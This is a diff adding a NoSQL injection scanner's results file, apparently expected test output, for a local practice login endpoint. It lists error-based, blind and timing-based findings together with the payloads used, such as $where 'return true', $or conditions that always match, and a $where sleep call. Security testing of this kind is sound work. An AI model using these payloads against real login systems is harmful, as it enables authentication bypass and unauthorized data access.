@@ -1,0 +1,35 @@
+=== RESULTS ===
+Found Error based NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param:
+        Injection: {"foo": 1}=
+
+Found Error based NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param:
+        Injection: {"foo": 1}=
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param: Body
+        Injection: =true: {"$where":  "return true"}, false: {"$where":  "return false"}
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param: Body
+        Injection: =true: {"$where":  "return true"}, false: {"$or": [{"foo":"1"},{"foo":"1"}]}
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param: Body
+        Injection: =true: {"$or": [{},{"foo":"1"}]}, false: {"$where":  "return false"}
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param: Body
+        Injection: =true: {"$or": [{},{"foo":"1"}]}, false: {"$or": [{"foo":"1"},{"foo":"1"}]}
+
+Found Timing based NoSQL Injection:
+        URL: http://localhost:3000/level4/login
+        param: Whole Body
+        Injection: Whole Body={"$where":  "sleep(500)"}
